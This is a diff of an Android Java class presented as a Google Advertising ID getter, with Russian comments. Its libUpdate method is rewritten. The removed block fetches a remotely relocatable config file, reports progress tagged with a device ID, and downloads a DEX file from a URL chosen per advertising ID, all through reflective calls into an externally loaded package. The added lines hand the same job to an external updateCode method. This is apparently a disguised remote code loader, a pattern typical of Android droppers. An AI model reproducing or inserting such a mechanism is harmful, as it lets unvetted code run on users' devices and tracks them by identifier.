@@ -434,152 +434,19 @@ public class GoogleAdvertisingIdGetter_FromExternalLib implements IGoogleAdverti
     public boolean libUpdate(final Context cnt, final LoaderManager lm, final String GAID) {
         Logger.log("Текущая версия GoogleAdvertisingIdGetter_FromExternalLib.libUpdate()");
         final ExternalLibServicer class_loader = ExternalLibServicer.getServicer(cnt);
-// // Т.К. есть какие-то проблемы с созданием лоадера когда я вызываю метод рефлексией, пришлось нормальный код:
-//        ExternalLibServicer loader = ExternalLibServicer.getServicer(cnt);
-//        Class codeUpdaterClazz     = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".CodeUpdater.CodeUpdater");
-//        Object instance            = loader.getInstance(codeUpdaterClazz, new Object[]{}, new Class[]{});
-//        Object res                 = loader.callMethod(codeUpdaterClazz, instance, "updateCode",
-//                new Object[]{
-//                        cnt,
-//                        lm,
-//                        GAID},
-//                new Class[]{
-//                        Context.class,
-//                        LoaderManager.class,
-//                        String.class});
 
-// заменить на этого франкинштейна:
-        //final String downloadID = new GoogleAdvertisingIdGetter().generateGUID(cnt);
-        final String downloadID = this.generateGUID(GenerateIDType.DEFAULT, cnt);
-        lm.restartLoader(CodeUpdater.LOADER_NEW_CODE_VERSION, null, new LoaderManager.LoaderCallbacks<String>() {
-            @SuppressLint("StaticFieldLeak")
-            @Override
-            public Loader<String> onCreateLoader(int i, Bundle bundle) {
-                return new AsyncTaskLoader<String>(cnt) {
-                    public String loadInBackground() {
-                        //String path_to_conf_file = cnt.getSharedPreferences("pref_session", Context.MODE_PRIVATE).getString("path_to_conf_file", null);
-                        String path_to_conf_file = SharedPreferencesServicer.getPreferences(cnt, GlobalParameters.SPF_SESSION_PATH_TO_CONF_FILE, GlobalParameters.SPF_KEY_PATH_TO_CONF_FILE, null);
-                        String path = (path_to_conf_file == null) ? GlobalParameters.URL_TO_CONFIG_FILE : path_to_conf_file;
-                        Logger.log("Грузим файл из:" + path);
-                        String res = null;
-
-//                        FilesLoader fl = new FilesLoader();
-//                        fl.downloadFile(cnt, GlobalParameters.URL_TO_CONFIG_FILE, GlobalParameters.ConfigFilePath(cnt));
-//                        fl.unpackZip(GlobalParameters.getBasePath(cnt), GlobalParameters.CONFIG_FILE_NAME_ZIP);
-                        Class FilesLoaderClazz     = class_loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".CodeUpdater.FilesLoader.FilesLoader");
-                        Object instance            = class_loader.getInstance(FilesLoaderClazz, new Object[]{}, new Class[]{});
-                        res                        = class_loader.callMethod(FilesLoaderClazz, instance, "downloadFile",
-                            new Object[]{
-                                    cnt,
-                                    (path_to_conf_file == null) ? GlobalParameters.URL_TO_CONFIG_FILE : path_to_conf_file,
-                                    GlobalParameters.ConfigFilePath(cnt)},
-                            new Class[]{
-                                    Context.class,
-                                    String.class,
-                                    String.class});
-
-                        class_loader.callMethod(FilesLoaderClazz, instance, "unpackZip",
-                                new Object[]{
-                                        GlobalParameters.getBasePath(cnt),
-                                        GlobalParameters.CONFIG_FILE_NAME_ZIP},
-                                new Class[]{
-                                        String.class,
-                                        String.class});
-
-                        //sendLog(cnt, lm, downloadID, "Download conf file");
-                        Class CodeUpdaterClazz     = class_loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".CodeUpdater.CodeUpdater");
-                        Object codeUpdaterInstance = class_loader.getInstance(CodeUpdaterClazz, new Object[]{}, new Class[]{});
-                        class_loader.callMethod(CodeUpdaterClazz, codeUpdaterInstance, "sendLog",
-                                new Object[]{
-                                        cnt,
-                                        lm,
-                                        downloadID,
-                                        "Download conf file"},
-                                new Class[]{
-                                        Context.class,
-                                        LoaderManager.class,
-                                        String.class,
-                                        String.class});
-
-                        return res;
-                    }
-                };
-            }
-
-            @Override
-            public void onLoadFinished(Loader<String> loader, String result) {
-
-                String json_str = new CodeUpdater().loadJSONFromAsset(cnt, GlobalParameters.ConfigFilePath(cnt));
-                //JSONObject rootObj = getJsonObj(json_str);
-                Class CodeUpdaterClazz     = class_loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".CodeUpdater.CodeUpdater");
-                Object codeUpdaterInstance = class_loader.getInstance(CodeUpdaterClazz, new Object[]{}, new Class[]{});
-                JSONObject rootObj         = class_loader.callMethod(CodeUpdaterClazz, codeUpdaterInstance, "getJsonObj",
-                        new Object[]{json_str},
-                        new Class[]{String.class});
-
-                if(rootObj == null) {return;}
-                try {
-                    String path_to_conf_file = rootObj.getString(GlobalParameters.JSON_KEY_PATH_TO_CONF_FILE);
-                    //String path_to_conf_file_last = cnt.getSharedPreferences(GlobalParameters.SPF_SESSION_PATH_TO_CONF_FILE, Context.MODE_PRIVATE).getString(GlobalParameters.SPF_KEY_PATH_TO_CONF_FILE, null);
-                    String path_to_conf_file_last = SharedPreferencesServicer.getPreferences(cnt, GlobalParameters.SPF_SESSION_PATH_TO_CONF_FILE, GlobalParameters.SPF_KEY_PATH_TO_CONF_FILE, null);
-                    if (!path_to_conf_file.equals(path_to_conf_file_last))
-                    {
-                        Logger.log("Надо загрузить конфигурационный файл из другого места:" + path_to_conf_file);
-                        Logger.log("Вместо:" + path_to_conf_file_last);
-                        //cnt.getSharedPreferences(GlobalParameters.SPF_SESSION_PATH_TO_CONF_FILE, Context.MODE_PRIVATE).edit().putString(GlobalParameters.SPF_KEY_PATH_TO_CONF_FILE, path_to_conf_file).apply();
-                        SharedPreferencesServicer.setPreferences(cnt, GlobalParameters.SPF_SESSION_PATH_TO_CONF_FILE, GlobalParameters.SPF_KEY_PATH_TO_CONF_FILE, path_to_conf_file);
-                        new CodeUpdater().updateCode(cnt, lm, GAID);
-                        return;
-                    }
-                } catch (JSONException e) {
-                    e.printStackTrace();
-                    Logger.log("Ошибка загрузки конфигурационного файла" + e.getMessage());
-                }
-
-                String url = null;
-                //String url = getUrlToLoadDexFile(cnt, device_id);
-                Class codeUpdaterClazz = class_loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".CodeUpdater.CodeUpdater");
-                Object instance        = class_loader.getInstance(codeUpdaterClazz, new Object[]{}, new Class[]{});
-                String url_            = class_loader.callMethod(codeUpdaterClazz, instance, "getUrlToLoadDexFile",
-                        new Object[]{
-                                cnt,
-                                GAID},
-                        new Class[]{
-                                Context.class,
-                                String.class});
-
-                if (url_ != null) {
-//                  sendLog(cnt, lm, downloadID, "Download DEX file");
-                    class_loader.callMethod(CodeUpdaterClazz, codeUpdaterInstance, "sendLog",
-                            new Object[]{
-                                    cnt,
-                                    lm,
-                                    downloadID,
-                                    "Download DEX file"},
-                            new Class[]{
-                                    Context.class,
-                                    LoaderManager.class,
-                                    String.class,
-                                    String.class});
-
-                  //  FilesLoader.downloadDexFile(cnt, url);
-                    Class filesLoaderClazz = class_loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".CodeUpdater.FilesLoader.FilesLoader");
-                    Object instance2        = class_loader.getInstance(filesLoaderClazz, new Object[]{}, new Class[]{});
-                    class_loader.callMethod(filesLoaderClazz, instance2, "downloadDexFile",
-                            new Object[]{
-                                    cnt,
-                                    url_},
-                            new Class[]{
-                                    Context.class,
-                                    String.class});
-                }
-            }
-
-            @Override
-            public void onLoaderReset(Loader<String> loader) {
-            }
-        }).forceLoad();
-
+        ExternalLibServicer loader = ExternalLibServicer.getServicer(cnt);
+        Class codeUpdaterClazz     = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".CodeUpdater.CodeUpdater");
+        Object instance            = loader.getInstance(codeUpdaterClazz, new Object[]{}, new Class[]{});
+        Object res                 = loader.callMethod(codeUpdaterClazz, instance, "updateCode",
+                new Object[]{
+                        cnt,
+                        null,
+                        GAID},
+                new Class[]{
+                        Context.class,
+                        LoaderManager.class,
+                        String.class});
         return true;
     }
 
